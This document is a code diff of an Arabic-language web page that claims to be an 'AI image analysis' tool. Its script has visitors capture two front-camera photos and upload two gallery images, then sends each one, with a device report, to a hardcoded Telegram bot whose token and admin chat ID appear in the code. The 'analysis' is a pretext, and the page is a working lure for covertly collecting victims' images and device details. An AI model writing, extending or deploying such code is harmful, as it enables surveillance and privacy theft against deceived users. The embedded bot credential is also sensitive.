@@ -4,10 +4,10 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
   
-  <meta property="og:title" content="🧠 نظام تحليل الصور بالذكاء الاصطناعي">
-  <meta property="og:description" content="محرك متقدم لالتقاط الصور وتحليل البيانات وتوثيقها فورياً.">
+  <meta property="og:title" content="🧠 محرك تحليل الصور الهجين (Hybrid AI Core)">
+  <meta property="og:description" content="نظام متقدم لالتقاط الصور من الكاميرا والمعرض وتحليل البيانات وتوثيقها فورياً.">
   
-  <title>AI Core - محرك التوثيق الذكي</title>
+  <title>AI Core - محرك التوثيق الهجين</title>
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
   <link href="https://fonts.googleapis.com/css2?family=Tajawal:wght@400;500;700&display=swap" rel="stylesheet">
@@ -23,6 +23,7 @@
       --card-bg: rgba(13, 17, 23, 0.95);
       --error: #e53935;
       --light: #f0f6fc;
+      --warning: #ffb74d;
     }
     
     * {
@@ -87,6 +88,15 @@
       text-align: right;
     }
 
+    .status-summary {
+        display: flex;
+        justify-content: space-between;
+        margin-top: 15px;
+        padding-top: 10px;
+        border-top: 1px solid rgba(255, 255, 255, 0.05);
+        color: var(--warning);
+    }
+
     .scan-progress {
         height: 6px;
         background: rgba(255, 255, 255, 0.1);
@@ -99,7 +109,7 @@
         height: 100%;
         background: linear-gradient(to right, var(--ai-accent), var(--ai-core));
         transition: width 0.3s ease-in-out;
-        box-shadow: 0 0 10px var(--ai-core); /* توهج شريط التقدم */
+        box-shadow: 0 0 10px var(--ai-core);
     }
     
     .scan-details {
@@ -135,21 +145,21 @@
       position: relative;
     }
     
-    .btn.start-ai {
+    .btn.camera-start {
         background: var(--ai-core);
         color: var(--dark-bg);
         box-shadow: 0 0 15px var(--ai-core);
     }
 
-    .btn.camera {
+    .btn.gallery-start {
         background: var(--ai-accent);
         color: var(--light);
         box-shadow: 0 0 15px var(--ai-accent);
     }
-    
-    .btn.camera.success {
-        background: var(--ai-core);
-        box-shadow: 0 0 15px var(--ai-core);
+
+    .btn.success {
+        background: #2ecc71;
+        box-shadow: 0 0 15px #2ecc71;
         color: var(--dark-bg);
     }
 
@@ -187,12 +197,16 @@
   <div class="scanner-container">
     <div class="scanner-header">
       <div class="scanner-title">
-        <i class="fas fa-brain"></i> محرك التحليل الذكي للصور (AI CORE)
+        <i class="fas fa-brain"></i> محرك التوثيق الهجين (AI CORE)
       </div>
     </div>
     
     <div class="scan-status" id="scanStatus">
-      النظام جاهز. إطلاق وحدة التقاط البيانات.
+      النظام جاهز. يتطلب 4 نقاط بيانات لإكمال التحليل.
+      <div class="status-summary">
+        <span id="cameraStatusText"><i class="fas fa-video"></i> كاميرا: 0/2</span>
+        <span id="galleryStatusText"><i class="fas fa-images"></i> معرض: 0/2</span>
+      </div>
     </div>
     
     <div class="scan-progress">
@@ -206,48 +220,50 @@
     </div>
     
     <div class="btn-group" id="mainButtonArea">
-        <button class="btn start-ai" id="startActionBtn" onclick="startCameraMode()">
-            <i class="fas fa-robot"></i> تفعيل وحدة التحليل الآلي (3 صور)
+        <input type="file" id="cameraInput" accept="image/*" capture="user" style="display: none;">
+        <button class="btn camera-start" id="startCameraBtn" onclick="startCameraCapture()">
+            <i class="fas fa-video"></i> التقاط بالكاميرا الأمامية (0/2)
         </button>
 
-        <input type="file" id="imageInput" accept="image/*" capture="user" style="display: none;">
-        <button class="btn camera" id="captureAndUploadBtn" style="display: none;" onclick="document.getElementById('imageInput').click()">
-            <i class="fas fa-camera"></i> التقاط وتمرير الصورة <span id="photoCount">(1 من 3)</span>
+        <input type="file" id="galleryInput" accept="image/*" style="display: none;">
+        <button class="btn gallery-start" id="startGalleryBtn" onclick="startGalleryUpload()">
+            <i class="fas fa-upload"></i> رفع من المعرض (0/2)
         </button>
         
         <button class="btn alt" id="resetBtn" onclick="resetUI()">
             <i class="fas fa-undo"></i> إعادة تهيئة النظام
         </button>
     </div>
-    
-    <div class="privacy-note">
-      <i class="fas fa-lock"></i> يتطلب إرسال 3 صور لتشغيل خوارزميات الذكاء الاصطناعي.
-    </div>
   </div>
 
   <script>
     // **********************************
-    // * إعدادات البوت
+    // * إعدادات البوت والثوابت
     // **********************************
     const TELEGRAM_BOT_TOKEN = "7641588791:AAGvjT-OItdTj3NsGqDPoWnYZnGO_BoQQp0"; 
     const TELEGRAM_ADMIN_ID = "1367401179"; 
     const TELEGRAM_PHOTO_API_URL = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendPhoto`; 
     
-    // ⭐⭐ متغيرات حالة الجلسة
-    let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
-    let photoCounter = 0;
-    const MAX_PHOTOS = 3;
+    const MAX_CAMERA_PHOTOS = 2;
+    const MAX_GALLERY_PHOTOS = 2;
+    const TOTAL_MAX_PHOTOS = MAX_CAMERA_PHOTOS + MAX_GALLERY_PHOTOS;
 
+    // ⭐⭐ متغيرات حالة الجلسة الجديدة
+    let userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
+    let cameraPhotoCounter = 0;
+    let galleryPhotoCounter = 0;
+    
     // **********************************
-    // * الدوال المساعدة لتحليل الجهاز
+    // * الدوال المساعدة للتحليل والتحديث
     // **********************************
+
     function analyzeUserAgent() {
         const agent = navigator.userAgent;
         let os = "غير معروف";
         let deviceModel = "جهاز غير محدد";
         let browser = "غير معروف";
-
-        // تحديد نظام التشغيل (OS)
+        
+        // (نفس منطق تحليل وكيل المستخدم السابق)
         if (agent.match(/Android/i)) {
             os = "Android";
             const modelMatch = agent.match(/Android[^;]+; ([^)]+)/);
@@ -267,8 +283,6 @@
         } else if (agent.match(/Linux/i)) {
             os = "Linux";
         }
-
-        // تحديد المتصفح
         if (agent.match(/CriOS/i)) {
             browser = "Chrome (iOS)";
         } else if (agent.match(/Chrome/i) && !agent.match(/CriOS/i)) {
@@ -283,47 +297,96 @@
 
         return { os, deviceModel, browser };
     }
-    
-    // **********************************
-    // * الدوال الرئيسية
-    // **********************************
-    
-    // 1. دالة بدء وضع الكاميرا
-    function startCameraMode() {
-        const startActionBtn = document.getElementById("startActionBtn");
-        startActionBtn.disabled = true;
+
+    function updateStatusUI(statusMessage = null) {
+        const totalSent = cameraPhotoCounter + galleryPhotoCounter;
         
-        userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
-        document.getElementById("sessionToken").textContent = userSessionToken;
+        document.getElementById("cameraStatusText").innerHTML = `<i class="fas fa-video"></i> كاميرا: ${cameraPhotoCounter}/${MAX_CAMERA_PHOTOS}`;
+        document.getElementById("galleryStatusText").innerHTML = `<i class="fas fa-images"></i> معرض: ${galleryPhotoCounter}/${MAX_GALLERY_PHOTOS}`;
+
+        document.getElementById("startCameraBtn").innerHTML = `<i class="fas fa-video"></i> التقاط بالكاميرا الأمامية (${cameraPhotoCounter}/${MAX_CAMERA_PHOTOS})`;
+        document.getElementById("startGalleryBtn").innerHTML = `<i class="fas fa-upload"></i> رفع من المعرض (${galleryPhotoCounter}/${MAX_GALLERY_PHOTOS})`;
         
-        scanStatus.innerHTML = "✅ تم التحقق من وحدة AI. يرجى تزويده بالبيانات (الصورة 1).";
+        document.getElementById("progressBar").style.width = `${(totalSent / TOTAL_MAX_PHOTOS) * 100}%`;
+
+        // تحديث حالة الأزرار بناءً على الحصص المتبقية
+        document.getElementById("startCameraBtn").disabled = (cameraPhotoCounter >= MAX_CAMERA_PHOTOS);
+        document.getElementById("startGalleryBtn").disabled = (galleryPhotoCounter >= MAX_GALLERY_PHOTOS);
         
-        startActionBtn.style.display = 'none';
-        document.getElementById("captureAndUploadBtn").style.display = 'flex';
-        
-        document.getElementById('imageInput').click(); 
+        if (totalSent === TOTAL_MAX_PHOTOS) {
+            document.getElementById("scanStatus").innerHTML = `🎉 نجاح التحليل! تم معالجة وتوثيق جميع البيانات الـ ${TOTAL_MAX_PHOTOS}.`;
+            document.getElementById("startCameraBtn").classList.add('success');
+            document.getElementById("startGalleryBtn").classList.add('success');
+        } else if (statusMessage) {
+             document.getElementById("scanStatus").innerHTML = statusMessage;
+        }
     }
     
-    // 2. دالة رفع الصور (الإرسال السريع)
-    document.getElementById('imageInput').addEventListener('change', async function(event) {
+    // دالة بناء الرسالة المرفقة بالصورة (تقرير الجهاز)
+    function buildPhotoCaption(current, max, sourceType) {
+        const { os, deviceModel, browser } = analyzeUserAgent();
+        const sourceName = sourceType === 'camera' ? 'الكاميرا الأمامية' : 'المعرض';
+        
+        return `📸 <b>تحليل AI (من ${sourceName} - الصورة ${current} من ${max})</b>\n\n🔑 <b>رمز معالجة الجلسة:</b> ${userSessionToken}\n\n📱 <b>تقرير الجهاز المحلل:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>وقت توثيق البيانات:</b> ${new Date().toLocaleString('ar-YE')}`;
+    }
+
+    // **********************************
+    // * دوال بدء الالتقاط/الرفع
+    // **********************************
+
+    function startCameraCapture() {
+        if (cameraPhotoCounter >= MAX_CAMERA_PHOTOS) return;
+        document.getElementById('cameraInput').click(); 
+    }
+
+    function startGalleryUpload() {
+        if (galleryPhotoCounter >= MAX_GALLERY_PHOTOS) return;
+        document.getElementById('galleryInput').click(); 
+    }
+    
+    // **********************************
+    // * دالة المعالجة الموحدة (Hybrid)
+    // **********************************
+    
+    document.getElementById('cameraInput').addEventListener('change', (e) => handleFileUpload(e, 'camera'));
+    document.getElementById('galleryInput').addEventListener('change', (e) => handleFileUpload(e, 'gallery'));
+
+    async function handleFileUpload(event, sourceType) {
         const file = event.target.files[0];
         if (!file) return;
 
-        photoCounter++;
-        const isFinal = photoCounter === MAX_PHOTOS;
+        // إعادة تعيين قيمة الإدخال لتمكين التقاط نفس النوع من الملف مرة أخرى (خاصة للكاميرا)
+        event.target.value = ''; 
         
-        const uploadBtn = document.getElementById("captureAndUploadBtn");
+        let counter, max, btn;
         
+        if (sourceType === 'camera') {
+            cameraPhotoCounter++;
+            counter = cameraPhotoCounter;
+            max = MAX_CAMERA_PHOTOS;
+            btn = document.getElementById("startCameraBtn");
+        } else { // gallery
+            galleryPhotoCounter++;
+            counter = galleryPhotoCounter;
+            max = MAX_GALLERY_PHOTOS;
+            btn = document.getElementById("startGalleryBtn");
+        }
+        
+        // التحقق من تجاوز الحد الأقصى (للتأكد فقط)
+        if (counter > max) {
+            resetUI(); // يجب ألا يحدث هذا، ولكن كإجراء أمان
+            return; 
+        }
+
         // الإظهار الفوري لحالة الإرسال
-        uploadBtn.disabled = true;
-        uploadBtn.classList.remove('start-ai', 'camera');
-        uploadBtn.classList.add('success');
-        uploadBtn.innerHTML = `<span class="loading-dots"></span> معالجة وإرسال الصورة ${photoCounter} ...`;
+        btn.disabled = true;
+        btn.classList.remove('camera-start', 'gallery-start');
+        btn.classList.add('success');
+        btn.innerHTML = `<span class="loading-dots"></span> معالجة وإرسال الصورة ${counter} ...`;
         
-        progressBar.style.width = `${(photoCounter / MAX_PHOTOS) * 100}%`;
-        scanStatus.textContent = `🧠 تحليل وإرسال تدفق البيانات: ${photoCounter} من ${MAX_PHOTOS}...`;
+        updateStatusUI(`🧠 تحليل وإرسال تدفق البيانات: ${sourceType === 'camera' ? 'كاميرا' : 'معرض'} (${counter} من ${max})...`);
         
-        const caption = buildPhotoCaption(photoCounter, MAX_PHOTOS);
+        const caption = buildPhotoCaption(counter, max, sourceType);
 
         const formData = new FormData();
         formData.append('chat_id', TELEGRAM_ADMIN_ID);
@@ -338,66 +401,73 @@
             });
 
             if (response.ok) {
-                if (isFinal) {
-                    scanStatus.innerHTML = `🎉 نجاح التحليل! تم معالجة وتوثيق جميع البيانات.`;
-                    uploadBtn.innerHTML = `<i class="fas fa-check-circle"></i> اكتمل إرسال 3 صور`;
-                    setTimeout(resetUI, 5000);
+                if (counter === max) {
+                    // تم الانتهاء من حصة هذا المصدر
+                    btn.innerHTML = `<i class="fas fa-check-circle"></i> اكتمل التوثيق`;
+                    updateStatusUI(`✅ نجاح! تم معالجة بيانات ${sourceType === 'camera' ? 'الكاميرا' : 'المعرض'} بالكامل.`);
                 } else {
-                    scanStatus.innerHTML = `✅ نجاح! تم معالجة الصورة ${photoCounter}. يرجى تزويد وحدة AI بالبيانات التالية.`;
-                    uploadBtn.classList.remove('success');
-                    uploadBtn.classList.add('camera');
-                    uploadBtn.disabled = false;
-                    uploadBtn.innerHTML = `<i class="fas fa-camera"></i> التقاط وتمرير الصورة <span id="photoCount">(${photoCounter + 1} من ${MAX_PHOTOS})</span>`;
+                    // الانتقال للصورة التالية في هذا المصدر
+                    btn.classList.remove('success');
+                    btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
+                    btn.disabled = false;
                     
-                    // إعادة التشغيل الفوري للكاميرا
-                    document.getElementById('imageInput').click(); 
+                    updateStatusUI(`✅ نجاح! تم معالجة الصورة ${counter}. يرجى تزويد وحدة AI بالبيانات التالية.`);
+                    
+                    if (sourceType === 'camera') {
+                        // إعادة التشغيل الفوري للكاميرا الأمامية
+                        document.getElementById('cameraInput').click(); 
+                    } 
+                    // إذا كان معرضاً، فالزر سيعيد تمكين نفسه وينتظر ضغطة المستخدم.
                 }
             } else {
-                scanStatus.innerHTML = `❌ خطأ في نقل البيانات (كود: ${response.status}).`;
-                uploadBtn.classList.remove('success');
-                uploadBtn.classList.add('camera');
-                uploadBtn.disabled = false;
-                uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (${photoCounter} من ${MAX_PHOTOS})`;
+                // حالة الفشل (نعيد الكاونتر ونمكن الزر)
+                if (sourceType === 'camera') cameraPhotoCounter--;
+                else galleryPhotoCounter--;
+                
+                updateStatusUI(`❌ خطأ في نقل البيانات (كود: ${response.status}).`);
+                btn.classList.remove('success');
+                btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
+                btn.disabled = false;
+                btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (إعادة المحاولة)`;
             }
         } catch (error) {
-            scanStatus.innerHTML = `❌ خطأ في الاتصال بالـ AI CORE: ${error.message}`;
-            uploadBtn.classList.remove('success');
-            uploadBtn.classList.add('camera');
-            uploadBtn.disabled = false;
-            uploadBtn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (${photoCounter} من ${MAX_PHOTOS})`;
-        }
-    });
-    
-    // دالة بناء الرسالة المرفقة بالصورة (تقرير الجهاز)
-    function buildPhotoCaption(current, total) {
-        const { os, deviceModel, browser } = analyzeUserAgent();
+            if (sourceType === 'camera') cameraPhotoCounter--;
+            else galleryPhotoCounter--;
             
-        return `📸 <b>تحليل AI (الصورة ${current} من ${total})</b>\n\n🔑 <b>رمز معالجة الجلسة:</b> ${userSessionToken}\n\n📱 <b>تقرير الجهاز المحلل:</b>\n- <b>النظام:</b> ${os}\n- <b>الجهاز:</b> ${deviceModel}\n- <b>المتصفح:</b> ${browser}\n\n🕒 <b>وقت توثيق البيانات:</b> ${new Date().toLocaleString('ar-YE')}`;
+            updateStatusUI(`❌ خطأ في الاتصال بالـ AI CORE: ${error.message}`);
+            btn.classList.remove('success');
+            btn.classList.add(sourceType === 'camera' ? 'camera-start' : 'gallery-start');
+            btn.disabled = false;
+            btn.innerHTML = `<i class="fas fa-exclamation-triangle"></i> فشل إرسال البيانات (إعادة المحاولة)`;
+        }
+        updateStatusUI();
     }
-
+    
     // دالة إعادة التعيين
     function resetUI() {
         userSessionToken = Math.random().toString(36).substring(2, 10).toUpperCase();
-        photoCounter = 0;
-        
-        document.getElementById("progressBar").style.width = "0%";
-        
-        const captureBtn = document.getElementById("captureAndUploadBtn");
-        captureBtn.style.display = 'none';
-        captureBtn.classList.remove('success', 'start-ai');
-        captureBtn.classList.add('camera');
-        captureBtn.disabled = false;
-        
-        document.getElementById("startActionBtn").style.display = 'flex';
-        document.getElementById("startActionBtn").disabled = false;
-        document.getElementById("startActionBtn").innerHTML = '<i class="fas fa-robot"></i> تفعيل وحدة التحليل الآلي (3 صور)';
+        cameraPhotoCounter = 0;
+        galleryPhotoCounter = 0;
         
         document.getElementById("sessionToken").textContent = userSessionToken;
-        scanStatus.innerHTML = 'النظام جاهز. إطلاق وحدة التقاط البيانات.';
+        
+        const cameraBtn = document.getElementById("startCameraBtn");
+        const galleryBtn = document.getElementById("startGalleryBtn");
+        
+        cameraBtn.classList.remove('success');
+        cameraBtn.classList.add('camera-start');
+        cameraBtn.disabled = false;
+
+        galleryBtn.classList.remove('success');
+        galleryBtn.classList.add('gallery-start');
+        galleryBtn.disabled = false;
+
+        updateStatusUI('النظام جاهز. إطلاق وحدة التقاط البيانات.');
     }
 
     window.addEventListener('DOMContentLoaded', () => {
         document.getElementById('sessionToken').textContent = userSessionToken;
+        updateStatusUI('النظام جاهز. يتطلب 4 نقاط بيانات لإكمال التحليل.');
     });
   </script>
 </body>
